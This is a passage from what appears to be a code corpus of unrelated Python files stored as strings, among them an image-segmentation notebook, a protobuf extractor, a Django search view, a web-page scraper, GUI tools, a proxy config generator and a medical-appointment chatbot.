right_padding = width - r_w\n    bottom_padding = height - r_h\n    padded_img = cv2.copyMakeBorder(img, 0, bottom_padding, 0, right_padding, cv2.BORDER_CONSTANT)\n    return padded_img, (bottom_padding, right_padding)\n\n# Apply preprocessig step - resize and pad input image\npadded_img, pad_info = resize_and_pad(np.array(img))\n\n# Convert input data from uint8 [0, 255] to float32 [0, 1] range and add batch dimension\nnormalized_img = np.expand_dims(padded_img.astype(np.float32) / 255, 0)\n\n\n# ### Run model inference\nout = compiled_model(normalized_img)[0]\nprint(\"\u2705 Test inference on sample image complete\")\n\n\nclass Label(NamedTuple):\n    index: int\n    color: Tuple\n    name: Optional[str] = None\n\nclass SegmentationMap(NamedTuple):\n    labels: List\n\n    def get_colormap(self):\n        return np.array([label.color for label in self.labels])\n\n    def get_labels(self):\n        labelnames = [label.name for label in self.labels]\n        if any(labelnames):\n            return labelnames\n        else:\n            return None\n\ndef segmentation_map_to_image(\n    result: np.ndarray, colormap: np.ndarray, remove_holes: bool = False\n) -> np.ndarray:\n    \"\"\"\n    Convert network result of floating point numbers to an RGB image with\n    integer values from 0-255 by applying a colormap.\n    :param result: A single network result after converting to pixel values in H,W or 1,H,W shape.\n    :param colormap: A numpy array of shape (num_classes, 3) with an RGB value per class.\n    :param remove_holes: If True, remove holes in the segmentation result.\n    :return: An RGB image where each pixel is an int8 value according to colormap.\n    \"\"\"\n    import cv2\n    if len(result.shape) != 2 and result.shape[0] != 1:\n        raise ValueError(\n            f\"Expected resul",
    "import os, json, asyncio\n\nresponses = {\n    0: \"Dump.cs was not found\",\n    1: \"Output directory was not found\",\n    2: \"Successfully extracted proto fields from dump.cs!\",\n    3: \"ignoredIMessages.json was not found, Did you delete it?\",\n    99: \"Error reading Dump.cs\"\n}\n\nignoredNames = []\nwith open('ignoredIMessages.json', 'r') as c:\n    ignoredNames = json.load(c)\n\nasync def getType(type, line, special):\n    if type == \"int\":\n        return \"int32\"\n    if type == \"uint\":\n        return \"uint32\"\n    if type == \"long\":\n        return \"int64\"\n    if type == \"bool\":\n        return \"bool\"\n    if type == \"string\":\n        return \"string\"\n    if type == \"double\":\n        return \"double\"\n    if type == \"float\":\n        return \"float\"\n    if type == \"ByteString\":\n        return \"bytes\"\n    else:\n        if special == 'No':\n            s = line.split(' ')\n            return s[3]\n        elif special == 'Repeat':\n            ls = line.split(' ')\n            s = ls[3].replace(\"RepeatedField<\", \"\").replace(\">\", \"\")\n            return s\n        elif special == 'Map':\n            s = line.split(' ')\n            return s[4].replace('>', '')\n\n\nasync def main(dump, out):\n    if not os.path.exists(dump):\n        return 0\n    \n    if not os.path.exists(out):\n        os.mkdir('output')\n    hi = 1\n    with open(dump, 'r') as f:\n        data = f.readlines()\n        fieldId = []\n        num = 0\n        start = False\n        for i, line in enumerate(data):\n            if line.startswith(\"static interface\"):\n                s = line.split(' ')\n                if len(s) > 5:\n                    name = s[2]\n                    col = s[3]\n                    msg = 'message PROTONAME {\\n'\n                    protoname = ''\n                    if s[4] and s[4] == \"IMessage,\" and name not in ignoredNames:\n                        protoname = name\n                        start = True\n                        msg = msg.replace('PROTONAME', name)\n\n            if start == True:\n                if line.strip().startswith('const int'):\n                    fieldIdInfo = line.split(' ')\n                    Id = fieldIdInfo[4].split(';')[0]\n                    fieldId.append(Id)\n                if line.strip().startswith('static abstract extern'):\n                    ls = line.split(' ')\n                    if not ('MessageParser' in ls[3] or 'MessageDescriptor' in ls[3]):\n                        if 'RepeatedField' in ls[3]:\n                            rawType = ls[3].replace(\"RepeatedField<\", \"\").replace(\">\", \"\")\n                            type = await getType(rawType, line, 'Repeat')\n                            msg = msg+'\\trepeated '+type+' '+ls[4]+' = '+fieldId[num]+';\\n'\n                            num = num+1\n                        elif '.' in ls[3]:\n                            oneofname = ls[3].split('.')[1]\n                            oneoffields = ' ' # Not implemented\n                            msg = msg+'\\toneof '+oneofname+' {'+oneoffields+'};\\n'\n                        elif 'MapField<' in ls[3]:\n                            rawtype1 = ls[3].replace('MapField<', '').replace('>', '').replace(',', '')\n                            rawtype2 = ls[4].replace('MapField<', '').replace('>', '')\n                            type1 = await getType(rawtype1, line, 'Map')\n                            type2 = await getType(rawtype2, line, 'Map')\n                            msg = msg+'\\tmap<'+type1+', '+type2+'> '+ls[5]+' = '+fieldId[num]+';\\n'\n                            num = num+1\n                        else:\n                            rawType = ls[3]\n                            type = await getType(rawType, line, 'No')\n                            msg = msg+'\\t'+type+' '+ls[4]+' = '+fieldId[num]+';\\n'\n                            num = num+1\n                elif line.strip().startswith('// Constructors'):\n                    if hi == 1:\n                        hi = 2\n                        with open(out+'/output.proto', 'a') as f:\n                            f.write('syntax = \"proto3\";\\n\\n')\n                    msg = msg+'}\\n\\n'\n                    with open(out+'/output.proto', 'a') as f:\n                         f.write(msg)\n                    start = False\n        return 2\n\nasync def init():\n    resp = await main('dump.cs', './output')\n    if resp is not None and responses[resp]:\n        print(responses[resp])\n    else:\n        print('Unknown error')\n        \nasyncio.run(init())\n",
    "# Exercize 1: Number to Text Transcription\ndef number_to_text(number):\n    number_transcription = {\n        0: \"zero\",\n        1: \"one\",\n        2: \"two\",\n        3: \"three\",\n        4: \"four\",\n        5: \"five\",\n        6: \"six\",\n        7: \"seven\",\n        8: \"eight\",\n        9: \"nine\",\n    }\n\n    if 0 <= number <= 9:\n        return number_transcription[number]\n    else:\n        return \"Choose a number between 0 and 9\"\n\n\nnumber = 7\ntext = number_to_text(number)\nprint(f\"{number} in text is: {text}\")\n\n\n# Exercize 2: Month number to Text Transcription\ndef month_num_to_text(number):\n    month_transcription = {\n        1: \"January\",\n        2: \"February\",\n        3: \"March\",\n        4: \"April\",\n        5: \"May\",\n        6: \"June\",\n        7: \"July\",\n        8: \"August\",\n        9: \"September\",\n        10: \"October\",\n        11: \"November\",\n        12: \"December\",\n    }\n\n    if 0 <= number <= 9:\n        return month_transcription[number]\n    else:\n        return \"Choose a number between 1 and 12\"\n\n\nnumber = 2\ntext = month_num_to_text(number)\nif number == 1:\n    print(f\"{number}st month of the year is called {text}\")\nelif number == 2:\n    print(f\"{number}nd month of the year is called {text}\")\nelif number == 3:\n    print(f\"{number}rd month of the year is called {text}\")\nelif 4 <= number <= 12:    \n    print(f\"{number}th month of the year is called {text}\")\nelse:\n    print(\"Choose a number must between 1 and 12\")",
    "from django.http import HttpResponse, JsonResponse\nfrom nltk.stem import PorterStemmer\nfrom nltk.tokenize import RegexpTokenizer\nfrom nltk.corpus import stopwords\nimport numpy as np\nfrom . import apps\n\nimport json\nimport os\n\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n\nclass PathConfig:\n    index = os.path.join(BASE_DIR, \"SE\\\\data\\\\index.jsonl\")\n    inverted_index = os.path.join(BASE_DIR, \"SE\\\\data\\\\inverted_index.jsonl\")\n    page_rank = os.path.join(BASE_DIR, \"SE\\\\data\\\\page_rank.jsonl\")\n    matrix = os.path.join(BASE_DIR, \"SE\\\\data\\\\adj_matrix.jsonl\")\n    tf_idf = os.path.join(BASE_DIR, \"SE\\\\data\\\\tf_idf.jsonl\")\n\n\ndef index(request):\n    return HttpResponse(\"Hello, world. You're at the polls index.\")\n\n\ndef search(request):\n    words = request.GET.get(\"words\")\n    mode = request.GET.get(\"mode\", \"vsm\")\n    ps = PorterStemmer()\n    stop_words = set(stopwords.words(\"english\"))\n    tokenizer = RegexpTokenizer(r\"\\w+\")\n    words = tokenizer.tokenize(words.lower())\n    words = [ps.stem(w) for w in words if not w in stop_words]\n\n    # Boolean\n    doc_set = set()\n    doc_map = {}\n    with open(PathConfig.inverted_index, \"r\", encoding=\"utf-8\") as file:\n        for line in file:\n            line = json.loads(line)\n            if line[\"key\"] in words:\n                content = line[\"content\"]\n                temp_doc_set = set()\n                for [doc, pos] in content:\n                    doc_set.add(doc)\n                    temp_doc_set.add(doc)\n                    # Boolean weight\n                for doc in temp_doc_set:\n                    doc_map[doc] = doc_map.get(doc) + 1 if doc_map.get(doc) else 1\n                temp_doc_set.clear()\n\n    doc_list = list(doc_set)\n    doc_rank_list = []\n\n    # page rank\n    if mode == \"page_rank\":\n        with open(PathConfig.page_rank, \"r\", encoding=\"utf-8\") as file:\n            for line in file:\n                line = json.loads(line)\n                if line[\"page_id\"] in doc_list:\n                    doc_rank_list.append(\n                        (line[\"page_id\"], line[\"score\"] + doc_map.get(line[\"page_id\"]))\n                    )\n        doc_rank_list.sort(key=lambda x: x[1], reverse=True)\n\n    # VSM\n    if mode == \"vsm\":\n        # calculate weight vector of each document\n        # calculate tf*idf/max_tf\n        vector1 = np.ones(len(words))\n        with open(PathConfig.tf_idf, \"r\", encoding=\"utf-8\") as file:\n            for line in file:\n                line = json.loads(line)\n                if line[\"page_id\"] in doc_list:\n                    max_tf = line[\"max_tf\"]\n                    tf_line = line[\"tf\"]\n                    vector_list = []\n                    for [key, tf, idf] in tf_line:\n                        if key in words:\n                            vector_list.append(tf * idf / max_tf)\n                    vector2 = np.array(vector_list)\n                    if len(vector_list) < len(words):\n                        vector2 = np.concatenate(\n                            (vector2, np.zeros(len(words) - len(vector_list)))\n                        )\n                    print(vector1, vector2)\n                    cos_sim = np.dot(vector1, vector2) / (\n                        np.linalg.norm(vector1) * np.linalg.norm(vector2)\n                    )\n                    doc_rank_list.append(\n                        (line[\"page_id\"], cos_sim + doc_map.get(line[\"page_id\"]))\n                    )\n        doc_rank_list.sort(key=lambda x: x[1], reverse=True)\n\n    # get page information\n    doc_info_list = []\n    for [key, score] in doc_rank_list:\n        info = apps.SeConfig.page_data[key]\n        info[\"score\"] = score\n        doc_info_list.append(info)\n\n    res = {\n        \"doc_rank\": doc_info_list,\n    }\n    return JsonResponse(res)\n\n\ndef get_all_keywords(request):\n    res = {\"keywords\": apps.SeConfig.keywords}\n    return JsonResponse(res)\n",
    "import asyncio\nfrom playwright.async_api import async_playwright\nfrom PIL import Image\nfrom tqdm import tqdm\nfrom multiprocessing import Pool\nimport os\nimport argparse\nimport logging\n\nfrom config import Config\nfrom file_processor import read_pickle, dump_json, prepare_path\nfrom visualizer import draw_bbox\n\n\nconfig = Config()\nlogging.basicConfig(\n    level=logging.INFO, \n    format='%(asctime)s - %(message)s', \n    datefmt='%d-%b-%y %H:%M:%S', \n    handlers=[logging.FileHandler('logs.log')]\n)\n\n\nasync def get_elements_tree_structure(url, path):\n    async with async_playwright() as p:\n        browser = await p.chromium.launch()\n        context = await browser.new_context(viewport={'width': 1920, 'height': 1080})\n        page = await context.new_page()\n\n        await page.goto(url, timeout=60000)\n        \n        await page.wait_for_load_state('load')\n        page_size = await page.evaluate('''() => {\n            return {\n                width: document.documentElement.scrollWidth,\n                height: document.documentElement.scrollHeight\n            };\n        }''')\n        await page.set_viewport_size(page_size)\n        \n        await page.wait_for_load_state('load')\n        \n        elements_info = await page.evaluate('''() => {\n            function hasVisibleText(text) {\n                // \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u67e5\u6587\u672c\u662f\u5426\u5305\u542b\u975e\u7a7a\u767d\u5b57\u7b26\n                return /[\\x21-\\x7E]/.test(text);\n            }\n            function getElementInfo(node, path) {\n                if (node.nodeType !== 1 && node.nodeType !== 3 || node.tagName && (node.tagName.toLowerCase() === 'script' || node.tagName.toLowerCase() === 'noscript')) {\n                    return null;\n                }\n                let info = {};\n                if (node.nodeType === 3) { // Text node\n                    if (!hasVisibleText(node.nodeValue)) { // Exclude text nodes which only contain whitespace\n                        return null;\n                    }\n                    if (!node.nodeValue.trim()) { // Exclude text nodes which only contain whitespace\n                        return null;\n                    }\n                    // Get bounding box for text node using Range\n                    var range = document.createRange();\n                    range.selectNode(node);\n                    var rect = range.getBoundingClientRect();\n                    info = {\n                        type: \"text\",\n                        textContent: node.nodeValue.trim(),\n                        xpath: path,\n                        boxInfo: {\n                            top: rect.top,\n                            left: rect.left,\n                            width: rect.width,\n                            height: rect.height\n                        }\n                    };\n                } else if (node.nodeType === 1) { // Element node\n                    let rect = node.getBoundingClientRect();\n                    info = {\n                        type: \"element\",\n                        tagName: node.tagName.toLowerCase(),\n                        xpath: path,\n                        boxInfo: {\n                            top: rect.top,\n                            left: rect.left,\n                            width: rect.width,\n                            height: rect.height\n                        }\n                    };\n                    if (node.tagName.toLowerCase() === \"img\") {\n                        info.src = node.src;\n                        info.alt = node.alt;\n                    }\n                }\n                let children = [];\n                for (let i = 0; i < node.childNodes.length; i++) {\n                    let childNode = node.childNodes[i];\n                    let childInfo = getElementInfo(childNode, `${path}/node()[${i + 1}]`);\n                    if (childInfo) {\n                        children.push(childInfo);\n                    }\n                }\n                if (children.length > 0) {\n                    info.children = children;\n                }\n                return info;\n            }\n            return getElementInfo(document.body, \"/html/body\");\n        }''')\n\n        await page.screenshot(path=path, full_page=True)\n        await browser.close()\n        return elements_info\n\n\ndef process_url(args):\n    idx, config, url = args\n    logging.info(f\"Processing {url}\")\n    if url.endswith('.pdf'):\n        logging.error(f\"PDF file found at index {idx}\")\n        return None\n    try:\n        url_name = str(idx)\n        visible_elements_info = asyncio.run(get_elements_tree_structure(url, os.path.join('screenshots', url_name + '.png')))\n        if visible_elements_info is not None:\n            dump_json(visible_elements_info, os.path.join(config.annotations, url_name + '.json'))\n            bbox_img = draw_bbox(Image.open(os.path.join(config.screenshots, url_name + '.png')), visible_elements_info)\n            bbox_img.save(os.path.join(config.bbox_path, url_name + '.png'))\n            logging.info(f\"Processed {url}\")\n        else:\n            l",
    "import os\nimport json\nfrom pprint import pprint\n\ndef read_json_files(directory):\n    json_data = []\n    for filename in os.listdir(directory):\n        if filename.endswith('.json'):\n            file_path = os.path.join(directory, filename)\n            with open(file_path, 'r') as json_file:\n                data = json.load(json_file)\n                json_data.append(data)\n    return json_data\n\ndef match_candidates_to_job(parsed_resumes, job_description):\n    matched_candidates = []\n    for resume in parsed_resumes:\n        if any(skill.lower() in [s.lower() for s in resume['skills']] for skill in job_description['skills_required']):\n            if any(exp.lower() in [e.lower() for e in resume['experience']] for exp in job_description['experience_required']):\n                if any(edu.lower() in [e[0].lower() for e in resume['education']] for edu in job_description['education_required']):\n                    if all(comp.lower() in [c.lower() for c in resume['competencies']] for comp in job_description['competencies_required']):\n                        matched_candidates.append(resume['name'])\n                    elif not job_description['competencies_required']:\n                        matched_candidates.append(resume['name'])\n                elif not job_description['education_required']:\n                    matched_candidates.append(resume['name'])\n    return matched_candidates\n\ndef main():\n    # Read JSON files from the directory\n    resumes_dir = 'D:\\\\resumes'\n    parsed_resumes = read_json_files(resumes_dir)\n\n    # Sample job description data\n    job_description_data = {\n        'title': 'Data Scientist',\n        'skills_required': ['python', 'machine learning', 'data analysis'],\n        'education_required': ['BE','B.E.', 'B.E', 'BS', 'B.S', 'ME', 'M.E', 'M.E.', 'MS', 'M.S', 'BTECH', 'MTECH', 'SSC', 'HSC', 'CBSE', 'ICSE', 'X', 'XII' ],\n        'experience_required': ['data science', 'machine learning'],\n        'competencies_required': {'teamwork': ['collaboration', 'communication']},\n        'measurable_results_expected': {'revenue growth': ['increase sales']}\n    }\n\n    # Match candidates to job description\n    matched_candidates = match_candidates_to_job(parsed_resumes, job_description_data)\n\n    print(\"Matched Candidates:\")\n    pprint(matched_candidates)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import tkinter as tk\nimport customtkinter as ctk\nfrom fonts import *\nfrom PTOhistory import *\n\nclass HRAccessFrame:\n    def __init__(self, master, emp_id):\n        self.master = master\n        self.emp_id = emp_id\n        self.frame = ctk.CTkFrame(master=self.master, corner_radius=10, width=500, height=400)\n        self.frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)\n        self.welcome_label = ctk.CTkLabel(master=self.frame, text=f\"Welcome HR {self.emp_id}\", font=font2)\n        self.welcome_label.pack(pady=20)\n        self.menu_page_label = ctk.CTkLabel(master=self.frame, text=\"Menu Page\", font=font1)\n        self.menu_page_label.pack(pady=(10, 20))\n        self.document_button = ctk.CTkButton(master=self.frame, text=\"Document\", font=font3)\n        self.document_button.pack(pady=10, fill='x', padx=50)\n        self.history_button = ctk.CTkButton(master=self.frame, text=\"History\", font=font3, command=self.open_history_frame)\n        self.history_button.pack(pady=10, fill='x', padx=50)\n        self.plan_button = ctk.CTkButton(master=self.frame, text=\"Plan\", font=font3)\n        self.plan_button.pack(pady=10, fill='x', padx=50)\n        self.request_button = ctk.CTkButton(master=self.frame, text=\"Request\", font=font3)\n        self.request_button.pack(pady=10, fill='x', padx=50)\n        self.schedule_button = ctk.CTkButton(master=self.frame, text=\"Schedule\", font=font3)\n        self.schedule_button.pack(pady=10, fill='x', padx=50)\n\n\n    def open_history_frame(self):\n        # Close the current frame\n        self.frame.destroy()\n        # Close the entire EmployeeAccessFrame instance\n        self.frame.destroy()\n        ViewHistoryFrame(self.master, self.emp_id, 'HR')\n",
    "\"\"\"\nAuthor: peilongchencc@163.com\nDescription: \n\u5f02\u6b65\u540c\u65f6\u54112\u4e2a\u63a5\u53e3\u53d1\u9001\u5185\u5bb9,\u8fd92\u4e2a\u63a5\u53e3\u7684\u529f\u80fd\u662f\u4e00\u6837\u7684,\u53ea\u662f\u4e0d\u540c\u7684API,\u4f5c\u7528\u662fplan A\u548cplan B\u3002\u53ea\u8981\u5176\u4e2d\u4e00\u4e2a\u6709\u7ed3\u679c\u5c31\u8fd4\u56de\u90a3\u4e2a\u7ed3\u679c,\n\u53e6\u4e00\u4e2a\u63a5\u53e3\u5373\u4f7f\u62a5\u9519\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002\nRequirements: \nReference Link: \nNotes: \n\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u63a5\u53e3\u8c03\u7528\u5931\u8d25\uff08\u6bd4\u5982\u62a5\u9519\uff09\uff0c\u8fd9\u4e2a\u8c03\u7528\u672c\u8eab\u662f\u88ab\u89c6\u4e3a\u5df2\u5b8c\u6210\u7684\uff0c\u56e0\u4e3a `asyncio.wait` \u8003\u8651\u7684\u662f\u4efb\u52a1\u7684\u5b8c\u6210\u72b6\u6001\uff0c\n\u800c\u4e0d\u662f\u6210\u529f\u6216\u5931\u8d25\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u67d0\u4e2a\u63a5\u53e3\u8c03\u7528\u5931\u8d25\uff0c\u8fd9\u4e5f\u7b97\u662f\u4e00\u4e2a\u5b8c\u6210\u7684\u4efb\u52a1\uff0c\u53ea\u662f\u8fd4\u56de\u7ed3\u679c\u4f1a\u662f\u4e00\u4e2a\u5f02\u5e38\u5bf9\u8c61\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8fdb\u884c\u5904\u7406\u3002\n\"\"\"\nimport asyncio\nimport aiohttp\n\nasync def fetch(session, url, data):\n    try:\n        async with session.post(url, json=data) as response:\n            return await response.json()  # \u5047\u8bbeAPI\u8fd4\u56deJSON\u6570\u636e\n    except Exception as e:\n        return e  # \u8fd4\u56de\u9519\u8bef\u4fe1\u606f\n\nasync def fetch_first_complete(url1, url2, data):\n    async with aiohttp.ClientSession() as session:\n        task1 = asyncio.create_task(fetch(session, url1, data))\n        task2 = asyncio.create_task(fetch(session, url2, data))\n        \n        done, pending = await asyncio.wait(\n            [task1, task2], \n            return_when=asyncio.FIRST_COMPLETED\n        )\n        \n        for task in pending:\n            task.cancel()  # \u53d6\u6d88\u8fd8\u672a\u5b8c\u6210\u7684\u4efb\u52a1\n        \n        for task in done:\n            return task.result()    # \u83b7\u53d6\u5b8c\u6210\u7684\u4efb\u52a1\u7684\u7ed3\u679c\u3002\n\n# \u5047\u8bbe\u7684API URL\u548c\u8981\u53d1\u9001\u7684\u6570\u636e\nurl1 = \"http://localhost:8000/api/companyA\"\nurl2 = \"http://localhost:8000/api/companyB\"\n# data = {\"key\": \"value\"}\ndata = {\"key\": \"peilongchencc\"}\n\n# \u8fd0\u884c\u51fd\u6570\nresult = asyncio.run(fetch_first_complete(url1, url2, data))\nprint(result)",
    "#Distributed under MIT license.\n#Copyright \u00a92024 Peidong Sun\n#https://github.com/10032-bili/Serial-Command-Tool/\nimport tkinter as tk\nfrom tkinter import ttk, filedialog\nimport threading\nimport serial\nfrom serial.tools import list_ports\nimport json\nimport time\nimport base64\nfrom tkinter import ttk, PhotoImage\nclass SerialCommandAPP:\n    def __init__(self, master):\n        self.master = master\n        master.title('Serial tool v1.0 developed by \u00a9Peidong Sun 2024')\n        # List of threads managing program execution\n        self.program_threads = []\n        self.thread = None  # Initialize thread attribute\n        # Decode the ICON base64 string\n\n        # Create interface switch selection bar\n        self.mode_var = tk.StringVar()\n        self.mode_var.set(\"serial_command_execution\")  # Default set to serial command execution mode\n        self.mode_selector = ttk.Combobox(master, textvariable=self.mode_var, values=[\"serial_command_execution\", \"command_editing\"])\n        self.mode_selector.grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky=\"ew\")\n        self.mode_selector.bind(\"<<ComboboxSelected>>\", self.switch_mode)\n\n        # Serial command execution frame\n        self.serial_command_execution_frame = ttk.Frame(master)\n        self.serial_command_execution_frame.grid(row=1, column=0, columnspan=2)\n        self.create_serial_command_execution_ui(self.serial_command_execution_frame)\n\n        # Command editing frame\n        self.command_editing_frame = ttk.Frame(master)\n        self.command_editing_frame.grid(row=1, column=0, columnspan=2)\n        self.create_command_editing_ui(self.command_editing_frame)\n        self.command_editing_frame.grid_remove()\n\n        # Set up the closing event handler\n        self.master.protocol(\"WM_DELETE_WINDOW\", self.on_closing)\n        \n    def create_serial_command_execution_ui(self, frame):\n        \"\"\"Serial command execution interface\"\"\"\n        frame.columnconfigure(0, weight=1)\n        frame.rowconfigure(0, weight=1)\n        self.serial_port = None\n        self.running = False\n        self.start_time = None  # Initialize start time attribute\n\n        # Serial port selection and scan button\n        self.port_label = ttk.Label(frame, text=\"Select serial port:\")\n        self.port_label.grid(row=0, column=0)\n        self.port_combo = ttk.Combobox(frame)\n        self.port_combo.grid(row=0, column=1)\n        self.refresh_ports()\n\n        self.refresh_button = ttk.Button(frame, text=\"Scan ports\", command=self.refresh_ports)\n        self.refresh_button.grid(row=0, column=2)\n\n        # Baud rate selection\n        self.baudrate_label = ttk.Label(frame, text=\"Baud rate:\")\n        self.baudrate_label.grid(row=0, column=3)\n        self.baudrate_combo = ttk.Combobox(frame, values=[2400, 9600, 19200, 38400, 57600, 115200], state=\"readonly\")\n        self.baudrate_combo.grid(row=0, column=4)\n        self.baudrate_combo.set(\"19200\")\n\n        self.start_button = ttk.Button(frame, text=\"Start\", command=self.start_serial)\n        self.start_button.grid(row=0, column=5)\n\n        # Add text input box\n        self.input_text = ttk.Entry(frame)\n        self.input_text.grid(row=5, column=1, columnspan=6, padx=10, pady=10)\n\n        # Add send button\n        self.send_button = ttk.Button(frame, text='Send', command=self.send_serial)\n        self.send_button.grid(row=5, column=6, columnspan=2)\n\n        # Text box for displaying serial port data\n        self.serial_output_text = tk.Text(frame, height=15, width=50)\n        self.serial_output_text.grid(row=7, column=0, columnspan=8, padx=10, pady=10)\n\n        self.select_file_button = ttk.Button(frame, text=\"Select JSON file\", command=self.select_program_file)\n        self.select_file_button.grid(row=6, column=2, padx=10, pady=10)\n        # Start execution button\n        self.btn_execute = ttk.Button(frame, text=\"Start execution\", command=self.execute_program)\n        self.btn_execute.grid(row=6, column=3, padx=10, pady=10)\n\n        # Copyright information label\n        self.footer_label = ttk.Label(frame, text=\"Copyright \u00a92024 Peidong Sun. All Rights Reserved.\", background=\"gray\", foreground=\"white\")  \n        self.footer_label.grid(row=10, column=0, columnspan=8, sticky=\"ew\", pady=(10,0))\n\n        # Set row and column weights for window size adaptation\n        for i in range(8):\n            frame.columnconfigure(i, weight=1)\n        for i in range(7):\n            frame.rowconfigure(i, weight=1)\n\n    def switch_mode(self, event=None):\n        \"\"\"Switch interface mode\"\"\"\n        if self.mode_var.get() == \"serial_command_execution\":\n            self.serial_command_execution_frame.grid()\n            self.command_editing_frame.grid_remove()\n        elif self.mode_var.get() == \"command_editing\":\n            self.serial_command_execution_frame.grid_remove()\n            self.command_editing_frame.grid()\n\n    def select_program_file(self):\n        \"\"\"Select program file and load commands\"\"\"\n        self.file_path = filedialog.askopenfilename(title=",
    "import requests\nimport json\nimport sys\nimport sing_template_utils\n\ndef main(domain, uuid, platform, path):\n    template_json = sing_template_utils.template_json\n    mobile_inbounds = sing_template_utils.mobile_inbounds\n    desktop_inbounds = sing_template_utils.desktop_inbounds\n\n    # Step 1: Retrieve IP list from the API\n    url = 'https://api.hostmonit.com/get_optimization_ip'\n    headers = {'Content-Type': 'application/json'}\n    data = json.dumps({\"key\": \"iDetkOys\"})\n    response = requests.post(url, headers=headers, data=data)\n    ip_list = response.json()\n\n    # Step 2: Filter and sort IPs\n    valid_ips = ip_list['info']\n    sorted_ips = sorted(valid_ips, key=lambda x: x['line'])\n\n    # Step 3: Organize IPs by line and add to the template JSON\n    line_counters = {'CM': 1, 'CU': 1, 'CT': 1}\n    for ip in sorted_ips:\n        line = ip['line']\n        colo = ip['colo']\n        new_tag = f\"{line}{line_counters[line]}-{colo}\" if colo.lower() != \"default\" else f\"{line}{line_counters[line]}\"\n        new_node = {\n            \"type\": \"vless\",\n            \"tag\": new_tag,\n            \"server\": ip['ip'],\n            \"server_port\": 443,\n            \"uuid\": uuid,\n            \"tls\": {\n                \"enabled\": True,\n                \"server_name\": domain,\n                \"insecure\": False,\n                \"utls\": {\n                    \"enabled\": True,\n                    \"fingerprint\": \"chrome\"\n                }\n            },\n            \"transport\": {\n                \"type\": \"ws\",\n                \"path\": path,\n                \"headers\": {\n                    \"Host\": domain\n                },\n                \"early_data_header_name\": \"Sec-WebSocket-Protocol\",\n                \"max_early_data\": 2048\n            }\n        }\n        template_json['outbounds'].append(new_node)\n        template_json['outbounds'][0]['outbounds'].append(new_tag)\n        line_counters[line] += 1\n\n    # Set the default outbound to the first new node added\n    template_json['outbounds'][0]['default'] = template_json['outbounds'][0]['outbounds'][0]\n\n    if platform == \"mobile\":\n        template_json['inbounds'] = mobile_inbounds\n    elif platform == \"desktop\":\n        template_json['inbounds'] = desktop_inbounds\n    else:\n        raise ValueError(\"Unsupported platform specified\")\n\n    # Save the modified template JSON to a file\n    with open(f\"sing_cf_{platform}.json\", 'w') as f:\n        json.dump(template_json, f, indent=2)\n\nif __name__ == '__main__':\n    if len(sys.argv) != 5:\n        print(\"Usage: python main.py <domain> <uuid> <platform> <path>\")\n        sys.exit(1)\n    main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])\n",
    "import logging\nimport sys\nimport os\nimport os.path as op\nimport streamlit as st\nfrom llama_index.core import VectorStoreIndex, ServiceContext\nfrom llama_index.llms.openai import OpenAI\nimport openai\nfrom llama_index.core import SimpleDirectoryReader\nfrom llama_index.readers.file import CSVReader\nfrom pathlib import Path\n# https://sabeerali.medium.com/build-your-personal-rag-chatbot-chat-freely-with-your-data-powered-by-llamaindex-and-open-llms-63eb8ad1a053\nfrom llama_index.llms.huggingface import HuggingFaceLLM\nfrom llama_index.core.prompts import PromptTemplate\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nos.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\nos.environ['OPENAI_API_KEY'] = os.getenv('OPENAI_API_KEY')\n\nlogging.basicConfig(stream=sys.stdout, level=logging.INFO)\nlogging.getLogger().addHandler(logging.StreamHandler(stream=sys.stdout))\n\n# specify path to CSV file, OPENAI api_key, and model below\nFILE_PATH = \"data\"\nassert op.exists(FILE_PATH), f\"file not found at {FILE_PATH}, please check the file path.\"\n# assert op.exists(\nopenai.api_key = os.getenv('OPENAI_API_KEY')\n\nst.set_page_config(page_title=\"Chatbot for doctor appointment\", page_icon=\"\ud83e\udd99\",\n                   layout=\"centered\", initial_sidebar_state=\"auto\", menu_items=None)\nst.title(\"Chatbot for doctor appointment\")\nst.info(\"\u0e41\u0e0a\u0e17\u0e1a\u0e2d\u0e17\u0e0a\u0e48\u0e27\u0e22\u0e15\u0e2d\u0e1a\u0e04\u0e33\u0e16\u0e32\u0e21\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e19\u0e31\u0e14\u0e2b\u0e21\u0e32\u0e22\u0e41\u0e1e\u0e17\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e42\u0e23\u0e07\u0e1e\u0e22\u0e32\u0e1a\u0e32\u0e25\u0e28\u0e34\u0e23\u0e34\u0e23\u0e32\u0e0a \u0e1b\u0e34\u0e22\u0e21\u0e2b\u0e32\u0e23\u0e32\u0e0a\u0e01\u0e32\u0e23\u0e38\u0e13\u0e22\u0e4c \u0e14\u0e39\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e41\u0e1e\u0e17\u0e22\u0e4c\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e40\u0e15\u0e34\u0e21\u0e44\u0e14\u0e49\u0e17\u0e35\u0e48 https://www.siphhospital.com/th/medical-services/find-doctor\", icon=\"\ud83d\udcc3\")\n\nsystem_prompt = \"\"\"\nGiven the following doctors' data in the file 'data' including output_clean.csv, output_fill_na.csv, output.md, sip_doctor_profiles.jsonl to create a response in Thai to a patient asking about scheduling an appointment,\\\ninquiring about the doctor's expertise, or seeking a recommendation for a doctor based on their needs. \\\nNote that user may inquire in a more casual text and you need to understand infer what they need before response.\\\nIf user ask about doctor's data e.g. name, please provide information back in an easy to read format.\\\nUse only the data provided. The response should be in Thai and do not hallucinate. \\\n\"\"\"\n\nsystem_prompt = \"\"\"\n<|SYSTEM|>#\nGiven a request or question in Prompt Answer.csv, generate a response based on a predefined set of examples. For each request, refer to a specific example that matches the context and content of the input. The examples consist of requests related to medical appointments and consultations,\nalong with appropriate responses specifying appointments with medical specialists. Use the examples to guide the generation of a 